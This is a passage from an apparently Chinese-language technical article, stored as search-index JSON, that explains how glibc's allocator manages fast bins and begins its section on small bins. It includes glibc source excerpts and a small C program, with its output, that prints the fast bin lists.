\u200b\u7684\u200b\u5730\u5740\u200b\u662f\u200b malloc \u200b\u8fd4\u56de\u200b\u7684\u200b <code>payload</code> \u200b\u5730\u5740\u200b\u51cf\u53bb\u200b <code>2 * sizeof(size_t)</code>\uff0c\u200b\u5bf9\u5e94\u200b <code>mchunk_prev_size</code> \u200b\u548c\u200b <code>mchunk_size</code> \u200b\u4e24\u4e2a\u200b\u5b57\u200b\u6bb5\u200b\uff09\u3002\u200b\u4e8b\u5b9e\u4e0a\u200b\uff0c<code>mchunk_prev_size</code> \u200b\u4fdd\u5b58\u200b\u5728\u200b\u7528\u6237\u200b\u8bf7\u6c42\u200b\u7684\u200b\u7a7a\u95f4\u200b\u7684\u200b\u6700\u540e\u200b\u51e0\u4e2a\u200b\u5b57\u8282\u200b\u3002\u200b\u5185\u5b58\u200b\u5e03\u5c40\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code> in-use chunk         free chunk\n+-------------+      +------------------+\n| mchunk_size |      | mchunk_size      |\n+-------------+      +------------------+\n| payload     |      | fd               |\n|             |      +------------------+\n|             |      | bk               |\n|             |      +------------------+\n|             |      | fd_nextsize      |\n|             | ---&gt; +------------------+\n|             |      | bk_nextsize      |\n|             |      +------------------+\n|             |      | unused           |\n|             |      |                  |\n|             |      |                  |\n|             |      |                  |\n|             |      +------------------+\n|             |      | mchunk_prev_size |\n+-------------+      +------------------+\n</code></pre> <p>\u200b\u56e0\u6b64\u200b\u4e3a\u4e86\u200b\u5728\u200b payload \u200b\u548c\u200b <code>malloc_chunk</code> \u200b\u6307\u9488\u200b\u4e4b\u95f4\u200b\u8f6c\u6362\u200b\uff0c\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5b8f\u6765\u200b\u7b80\u5316\u200b\u6307\u9488\u200b\u8fd0\u7b97\u200b\uff1a</p> <pre><code>/* conversion from malloc headers to user pointers, and back */\n\n#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))\n#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))\n</code></pre> <p>\u200b\u77e5\u9053\u200b\u4e86\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5404\u4e2a\u200b bin \u200b\u7ef4\u62a4\u200b\u7684\u200b\u5c31\u662f\u200b\u8fd9\u4e9b\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u6240\u4ee5\u200b\u63a5\u4e0b\u6765\u200b\u5206\u522b\u200b\u770b\u200b\u8fd9\u200b\u51e0\u79cd\u200b bin \u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u5f0f\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#fast-bin","title":"fast bin","text":"<p>fast bin \u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u5f0f\u200b\u548c\u200b tcache \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5b83\u200b\u628a\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u6309\u7167\u200b\u5927\u5c0f\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b bin\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u8bb0\u5f55\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u8bb0\u5f55\u200b\u5404\u79cd\u200b bin \u200b\u5927\u5c0f\u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u76f4\u63a5\u200b\u7528\u200b\u7684\u200b\u5c31\u662f\u200b <code>malloc_chunk</code> \u200b\u6307\u9488\u200b\u6570\u7ec4\u200b\uff1a</p> <pre><code>typedef struct malloc_chunk *mfastbinptr;\nstruct malloc_state\n{\n  /* other fields are omitted */\n  /* Fastbins */\n  mfastbinptr fastbinsY[NFASTBINS];\n}\n</code></pre> <p>\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0b\u200b\uff0c\u200b\u9ed8\u8ba4\u200b <code>NFASTBINS</code> \u200b\u7b49\u4e8e\u200b 10\uff0c\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u6700\u5927\u200b\u7684\u200b\u7531\u200b fast bin \u200b\u7ba1\u7406\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u7b49\u4e8e\u200b <code>80 * sizeof(size_t) / 4 + sizeof(size_t)</code> \u200b\u5411\u4e0a\u200b\u53d6\u6574\u200b\u5230\u200b 16 \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u5728\u200b 64 \u200b\u4f4d\u200b\u673a\u5668\u200b\u4e0a\u200b\u7b49\u4e8e\u200b 176 \u200b\u5b57\u8282\u200b</li> <li>\u200b\u5206\u914d\u200b\u7c92\u5ea6\u200b\u4ece\u200b\u6700\u5c0f\u200b\u7684\u200b 32 \u200b\u5b57\u8282\u200b\u5230\u200b\u6700\u5927\u200b\u7684\u200b 176 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6bcf\u200b 16 \u200b\u5b57\u8282\u200b\u4e00\u4e2a\u200b bin\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 10 \u200b\u4e2a\u200b bin\uff08<code>(176 - 32) / 16 + 1 = 10</code>\uff09</li> </ol> <p>\u200b\u4e0d\u8fc7\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cfast bin \u200b\u7ba1\u7406\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u901a\u8fc7\u200b <code>set_max_fast(DEFAULT_MXFAST)</code> \u200b\u88ab\u200b\u9650\u5236\u200b\u5728\u200b <code>DEFAULT_MXFAST</code> \u200b\u9644\u8fd1\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u7b49\u4e8e\u200b <code>64 * sizeof(size_t) / 4</code>\uff0c\u200b\u52a0\u4e0a\u200b <code>sizeof(size_t)</code> \u200b\u518d\u200b\u5411\u4e0b\u200b\u53d6\u6574\u200b\u5230\u200b 16 \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u5c31\u662f\u200b 128 \u200b\u5b57\u8282\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u53ea\u6709\u200b\u524d\u200b 7 \u200b\u4e2a\u200b bin \u200b\u53ef\u4ee5\u200b\u88ab\u200b\u7528\u5230\u200b\uff0832 \u200b\u5b57\u8282\u200b\u5230\u200b 128 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6bcf\u200b 16 \u200b\u5b57\u8282\u200b\u4e00\u4e2a\u200b bin\uff0c<code>(128 - 32) / 16 + 1 = 7</code>\uff09\uff0c\u200b\u5373\u200b <code>malloc(120)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5206\u914d\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5230\u200b fast bin \u200b\u4e2d\u200b\uff0c<code>malloc(121)</code> \u200b\u6216\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5206\u914d\u200b\u5219\u200b\u4e0d\u4f1a\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#malloc_1","title":"malloc","text":"<p>\u200b\u5206\u914d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u548c\u200b tcache \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u8ba1\u7b97\u200b\u51fa\u200b fastbin \u200b\u7684\u200b index\uff0c\u200b\u7136\u540e\u200b\u53bb\u200b\u627e\u200b\u5bf9\u5e94\u200b\u7684\u200b\u94fe\u8868\u200b\uff0c\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u975e\u7a7a\u200b\uff0c\u200b\u5219\u200b\u4ece\u200b\u94fe\u8868\u200b\u5934\u200b\u53d6\u51fa\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7528\u4e8e\u200b\u5206\u914d\u200b\uff1a</p> <pre><code>#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n#define fastbin_index(sz) \\\n  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n// in _int_malloc, allocate using fastbin\nidx = fastbin_index (nb);\nmfastbinptr *fb = &amp;fastbin (av, idx);\nmchunkptr pp;\nvictim = *fb;\n\nif (victim != NULL)\n  {\n    if (SINGLE_THREAD_P)\n      *fb = victim-&gt;fd;\n    else\n      REMOVE_FB (fb, pp, victim);\n    if (__glibc_likely (victim != NULL))\n      {\n        size_t victim_idx = fastbin_index (chunksize (victim));\n        if (__builtin_expect (victim_idx != idx, 0))\n          malloc_printerr (\"malloc(): memory corruption (fast)\");\n        check_remalloced_chunk (av, victim, nb);\n        /* While we're here, if we see other chunks of the same size,\n          stash them in the tcache.  */\n        size_t tc_idx = csize2tidx (nb);\n        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\n          {\n            mchunkptr tc_victim;\n\n            /* While bin not empty and tcache not full, copy chunks.  */\n            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\n                  &amp;&amp; (tc_victim = *fb) != NULL)\n              {\n                if (SINGLE_THREAD_P)\n                  *fb = tc_victim-&gt;fd;\n                else\n                  {\n                    REMOVE_FB (fb, pp, tc_victim);\n                    if (__glibc_unlikely (tc_victim == NULL))\n                      break;\n                  }\n                tcache_put (tc_victim, tc_idx);\n              }\n          }\n        void *p = chunk2mem (victim);\n        alloc_perturb (p, bytes);\n        return p;\n      }\n  }\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u4f7f\u7528\u200b <code>fastbin_index (nb)</code> \u200b\u6839\u636e\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u8ba1\u7b97\u200b\u51fa\u200b fast bin \u200b\u7684\u200b index\uff0c\u200b\u7136\u540e\u200b <code>fastbin (av, idx)</code> \u200b\u5bf9\u5e94\u200b fast bin \u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b\u6307\u9488\u200b</li> <li>\u200b\u5982\u679c\u200b\u94fe\u8868\u200b\u975e\u7a7a\u200b\uff0c\u200b\u8bf4\u660e\u200b\u53ef\u4ee5\u200b\u4ece\u200b fast bin \u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u628a\u200b\u94fe\u8868\u200b\u5934\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5f39\u200b\u51fa\u200b\uff1a<code>*fb = victim-&gt;fd</code>\uff08\u200b\u5355\u7ebf\u7a0b\u200b\uff09\u200b\u6216\u200b <code>REMOVE_FB (fb, pp, victim)</code>\uff08\u200b\u591a\u7ebf\u7a0b\u200b\uff09\uff1b\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7684\u200b <code>fd</code> \u200b\u6307\u9488\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u6ca1\u6709\u200b\u7528\u5230\u200b</li> <li>\u200b\u8fdb\u884c\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u5b89\u5168\u68c0\u67e5\u200b\uff1a<code>__builtin_expect</code> \u200b\u548c\u200b <code>check_remalloced_chunk</code></li> <li>\u200b\u68c0\u67e5\u200b tcache \u200b\u5bf9\u5e94\u200b\u7684\u200b bin\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u6ee1\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b fast bin \u200b\u94fe\u8868\u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b\u632a\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u628a\u200b payload \u200b\u5730\u5740\u200b\u901a\u8fc7\u200b <code>chunk2mem</code> \u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u8fd4\u56de\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b</li> <li>\u200b\u8c03\u7528\u200b <code>alloc_perturb</code> \u200b\u5f80\u65b0\u200b\u5206\u914d\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5185\u200b\u5199\u5165\u200b\u5783\u573e\u200b\u6570\u636e\u200b\uff08\u200b\u53ef\u200b\u9009\u200b\uff09\uff0c\u200b\u907f\u514d\u200b\u6cc4\u9732\u200b\u4e4b\u524d\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u548c\u200b tcache \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u4ece\u200b thread local \u200b\u7684\u200b tcache \u200b\u6539\u6210\u200b\u4e86\u200b\u652f\u6301\u200b\u591a\u7ebf\u7a0b\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b\u591a\u7ebf\u7a0b\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4f7f\u7528\u200b CAS \u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u6765\u200b\u66f4\u65b0\u200b\u94fe\u8868\u200b\u5934\u90e8\u200b\uff1a</p> <pre><code>#define REMOVE_FB(fb, victim, pp) \\\n  do                              \\\n    {                             \\\n      victim = pp;                \\\n      if (victim == NULL)         \\\n        break;                    \\\n    }                             \\\n  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim);\n</code></pre> <p>\u200b\u6b63\u56e0\u5982\u6b64\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5206\u914d\u200b\u8fc7\u7a0b\u200b\u624d\u80fd\u200b\u505a\u5230\u200b\u6bd4\u8f83\u200b\u5feb\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u6837\u200b\u7684\u200b\u5206\u914d\u200b\u65b9\u6cd5\u200b\u53eb\u505a\u200b fast bin\u3002</p>"},{"location":"software/glibc_allocator.html#free_1","title":"free","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b free \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7a7a\u95f2\u200b\u5757\u200b\u662f\u200b\u5982\u4f55\u200b\u8fdb\u5165\u200b fast bin \u200b\u7684\u200b\uff1a</p> <pre><code>// in _int_free, after tcache handling\nif ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()))\n  {\n    /* check omitted */\n    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);\n\n    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, true);\n    unsigned int idx = fastbin_index(size);\n    fb = &amp;fastbin (av, idx);\n\n    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */\n    mchunkptr old = *fb, old2;\n\n    if (SINGLE_THREAD_P)\n      {\n        /* Check that the top of the bin is not the record we are going to\n          add (i.e., double free).  */\n        if (__builtin_expect (old == p, 0))\n          malloc_printerr (\"double free or corruption (fasttop)\");\n        p-&gt;fd = old;\n        *fb = p;\n      }\n    else\n      do\n        {\n          /* Check that the top of the bin is not the record we are going to\n            add (i.e., double free).  */\n          if (__builtin_expect (old == p, 0))\n            malloc_printerr (\"double free or corruption (fasttop)\");\n          p-&gt;fd = old2 = old;\n        }\n      while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n              != old2);\n\n    /* check omitted */\n  }\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u903b\u8f91\u200b\u5f88\u200b\u7b80\u5355\u200b\uff1a\u200b\u5982\u679c\u200b\u5927\u5c0f\u200b\u5408\u9002\u200b\uff0c\u200b\u5c31\u200b\u76f4\u63a5\u200b\u6dfb\u52a0\u200b\u5230\u200b fast bin \u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u91cc\u200b\uff0c\u200b\u6ca1\u6709\u200b tcache \u200b\u90a3\u6837\u200b\u7684\u200b\u957f\u5ea6\u200b\u9650\u5236\u200b\uff0c\u200b\u591a\u7ebf\u7a0b\u200b\u573a\u666f\u200b\u4e0b\u200b\u4f9d\u7136\u200b\u662f\u200b\u7528\u200b CAS \u200b\u6765\u200b\u5b9e\u73b0\u200b\u539f\u5b50\u200b\u7684\u200b\u94fe\u8868\u200b\u63d2\u5165\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b tcache\uff0cfast bin \u200b\u7684\u200b double free \u200b\u68c0\u67e5\u200b\u66f4\u52a0\u200b\u7b80\u964b\u200b\uff1a\u200b\u5b83\u200b\u53ea\u80fd\u200b\u9632\u62a4\u200b\u8fde\u7eed\u200b\u4e24\u6b21\u200b free \u200b\u540c\u4e00\u4e2a\u200b\u5757\u200b\uff0c\u200b\u53ea\u200b\u5224\u65ad\u200b\u4e86\u200b\u8981\u200b\u63d2\u5165\u200b\u94fe\u8868\u200b\u7684\u200b\u5757\u200b\u662f\u5426\u200b\u5728\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u5728\u200b\u94fe\u8868\u200b\u4e2d\u95f4\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#_3","title":"\u5b9e\u9a8c","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u5199\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u6765\u200b\u89c2\u5bdf\u200b fast bin \u200b\u7684\u200b\u66f4\u65b0\u8fc7\u7a0b\u200b\uff1a</p> <ol> <li>\u200b\u7531\u4e8e\u200b fastbin \u200b\u4fdd\u5b58\u200b\u5728\u200b <code>main_arena</code> \u200b\u4e2d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u627e\u5230\u200b <code>main_arena</code> \u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5730\u5740\u200b</li> <li><code>main_arena</code> \u200b\u4e0d\u200b\u5728\u200b libc \u200b\u7b26\u53f7\u8868\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u76f4\u63a5\u200b\u627e\u5230\u200b\u5b83\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b libc \u200b\u7684\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\uff0c\u200b\u627e\u5230\u200b\u5b83\u200b\u76f8\u5bf9\u200b image base \u200b\u7684\u200b offset \u200b\u662f\u200b <code>0x1ecb80</code></li> <li>\u200b\u518d\u200b\u627e\u200b\u4e00\u4e2a\u200b\u5728\u200b\u7b26\u53f7\u8868\u200b\u4e2d\u200b\u7684\u200b\u7b26\u53f7\u200b <code>_IO_2_1_stdout_</code>\uff0c\u200b\u5b83\u200b\u76f8\u5bf9\u200b image base \u200b\u7684\u200b offset \u200b\u662f\u200b <code>0x1ed6a0</code></li> <li>\u200b\u6839\u636e\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u627e\u5230\u200b libc \u200b\u7684\u200b image base \u200b\u5730\u5740\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a8\u65ad\u200b <code>main_arena</code> \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fdb\u800c\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u7684\u200b fast bin</li> <li>\u200b\u4e0b\u9762\u200b\u5199\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8fdb\u5165\u200b fast bin \u200b\u7684\u200b\u8fc7\u7a0b\u200b</li> </ol> <pre><code>#include &lt;stddef.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct malloc_chunk {\n  size_t mchunk_prev_size; /* Size of previous chunk (if free).  */\n  size_t mchunk_size;      /* Size in bytes, including overhead. */\n\n  struct malloc_chunk *fd; /* double links -- used only if free. */\n  struct malloc_chunk *bk;\n\n  /* Only used for large blocks: pointer to next larger size.  */\n  struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */\n  struct malloc_chunk *bk_nextsize;\n};\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n#define INTERNAL_SIZE_T size_t\n\n/* MALLOC_ALIGNMENT equals to 16 on 64-bit */\n#define MALLOC_ALIGNMENT                                                       \\\n  (2 * SIZE_SZ &lt; __alignof__(long double) ? __alignof__(long double)           \\\n                                          : 2 * SIZE_SZ)\n\n/* The corresponding word size.  */\n/* SIZE_SZ equals to 8 on 64-bit */\n#define SIZE_SZ (sizeof(INTERNAL_SIZE_T))\n\n/* The corresponding bit mask value.  */\n/* MALLOC_ALIGN_MASK equals to 15 on 64-bit */\n#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)\n\n/* The smallest possible chunk */\n/* MIN_CHUNK_SIZE equals to 32 on 64-bit */\n#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))\n\n/* The smallest size we can malloc is an aligned minimal chunk */\n/* MINSIZE equals to 32 on 64-bit */\n#define MINSIZE                                                                \\\n  (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))\n\n/* equivalent to max(alignUp(req + SIZE_SZ, MALLOC_ALIGNMENT), MINSIZE) */\n#define request2size(req)                                                      \\\n  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                             \\\n       ? MINSIZE                                                               \\\n       : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n\n/* MAX_FAST_SIZE equals to 160 on 64-bit */\n#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)\n\n/* NFASTBINS equals to 10 on 64-bit */\n#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)\n\nstruct malloc_state {\n  /* Serialize access.  */\n  int mutex;\n  /* Flags (formerly in max_fast).  */\n  int flags;\n  /* Set if the fastbin chunks contain recently inserted free blocks.  */\n  /* Note this is a bool but not all targets support atomics on booleans.  */\n  int have_fastchunks;\n  /* Fastbins */\n  struct malloc_chunk *fastbinsY[NFASTBINS];\n};\n\nvoid dump_fastbin() {\n  void *libc_base = (char *)stdout - 0x1ed6a0; // offset of _IO_2_1_stdout_\n  struct malloc_state *main_arena =\n      libc_base +\n      0x1ecb80; // offset of main_arena\n  for (int i = 0; i &lt; NFASTBINS; i++) {\n    if (main_arena-&gt;fastbinsY[i]) {\n      struct malloc_chunk *p = main_arena-&gt;fastbinsY[i];\n      printf(\"fastbin #%d: %p\", i, p);\n      p = p-&gt;fd;\n      while (p) {\n        printf(\" -&gt; %p\", p);\n        p = p-&gt;fd;\n      }\n      printf(\"\\n\");\n    }\n  }\n}\n\nint main() {\n  // use 10 malloc + free, the first 7 blocks will be saved in tcache, the rest\n  // ones will go to fastbin\n  void *ptrs[10];\n  printf(\"allocate 10 pointers:\");\n  for (int i = 0; i &lt; 10; i++) {\n    ptrs[i] = malloc(32);\n    printf(\" %p\", ptrs[i]);\n  }\n  printf(\"\\n\");\n\n  // now one ptr goes to fastbin\n  for (int i = 0; i &lt; 8; i++) {\n    free(ptrs[i]);\n  }\n\n  printf(\"fastbins after 8 pointers freed:\\n\");\n  dump_fastbin();\n\n  // free the 9th one\n  free(ptrs[8]);\n\n  // two pointers in the fastbin\n  printf(\"fastbins after 9 pointers freed:\\n\");\n  dump_fastbin();\n\n  // free the 10th one\n  free(ptrs[9]);\n\n  // three pointers in the fastbin\n  printf(\"fastbins after 10 pointers freed:\\n\");\n  dump_fastbin();\n  return 0;\n}\n</code></pre> <p>\u200b\u8f93\u51fa\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>allocate 10 pointers: 0x563bd918d6b0 0x563bd918d6e0 0x563bd918d710 0x563bd918d740 0x563bd918d770 0x563bd918d7a0 0x563bd918d7d0 0x563bd918d800 0x563bd918d830 0x563bd918d860\nfastbins after 8 pointers freed:\nfastbin #1: 0x563bd918d7f0\nfastbins after 9 pointers freed:\nfastbin #1: 0x563bd918d820 -&gt; 0x563bd918d7f0\nfastbins after 10 pointers freed:\nfastbin #1: 0x563bd918d850 -&gt; 0x563bd918d820 -&gt; 0x563bd918d7f0\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ee3\u7801\u200b\u5148\u200b\u5206\u914d\u200b\u4e86\u200b\u5341\u4e2a\u200b\u5757\u200b\uff0c\u200b\u518d\u200b\u6309\u200b\u987a\u5e8f\u200b\u91ca\u653e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u524d\u200b\u4e03\u4e2a\u200b\u5757\u200b\u4f1a\u200b\u8fdb\u5165\u200b tcache\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u4e09\u4e2a\u200b\u5757\u200b\u5219\u200b\u8fdb\u5165\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b fast bin\uff0c\u200b\u5e76\u4e14\u200b\u540e\u200b\u91ca\u653e\u200b\u7684\u200b\u4f1a\u200b\u5728\u200b\u94fe\u8868\u200b\u7684\u200b\u5f00\u5934\u200b\u3002\u200b\u6ce8\u610f\u200b fast bin \u200b\u94fe\u8868\u200b\u91cc\u200b\u7684\u200b\u5730\u5740\u200b\u6253\u5370\u200b\u7684\u200b\u662f\u200b chunk \u200b\u5730\u5740\u200b\uff0c\u200b\u800c\u7528\u200b <code>malloc</code> \u200b\u5206\u914d\u200b\u7684\u200b\u5730\u5740\u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b payload \u200b\u90e8\u5206\u200b\uff0c\u200b\u4e8c\u8005\u200b\u5dee\u200b\u4e86\u200b 16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6700\u7ec8\u200b fast bin \u200b\u5c31\u662f\u200b\u628a\u200b\u5341\u4e2a\u200b\u5757\u200b\u91cc\u200b\u6700\u540e\u200b\u4e09\u4e2a\u200b\u5757\u200b\u7528\u200b\u94fe\u8868\u200b\u4e32\u200b\u8d77\u6765\u200b\u3002\u200b\u7531\u4e8e\u200b\u603b\u662f\u200b\u5f80\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b\u63d2\u5165\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u6240\u4ee5\u200b\u540e\u200b\u91ca\u653e\u200b\u7684\u200b\u5757\u200b\u51fa\u73b0\u200b\u5728\u200b\u9760\u200b\u524d\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#small-bin","title":"small bin","text":"<p>\u200b\u5206\u6790\u200b\u5b8c\u200b fast bin\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u6765\u770b\u200b small bin\u3002small bin \u200b\u6bcf\u4e2a\u200b bin \u200b\u5185\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u662f\u200b\u4ee5\u200b\u94fe\u8868\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#malloc_2","title":"malloc","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u89c2\u5bdf\u200b <code>_int_malloc</code> \u200b\u662f\u200b\u600e\u4e48\u200b\u4f7f\u7528\u200b small bin \u200b\u7684\u200b\u3002\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0c<code>_int_malloc</code> \u200b\u9996\u5148\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5728\u200b fast bin \u200b\u4e2d\u200b\u5206\u914d\u200b\uff0c\u200b\u5982\u679c\u200b\u5206\u914d\u200b\u5931\u8d25\u200b\uff0c\u200b\u6216\u8005\u200b\u5927\u5c0f\u200b\u8d85\u51fa\u200b\u4e86\u200b fast bin \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5728\u200b small bin \u200b\u4e2d\u200b\u5206\u914d\u200b\uff1a</p> 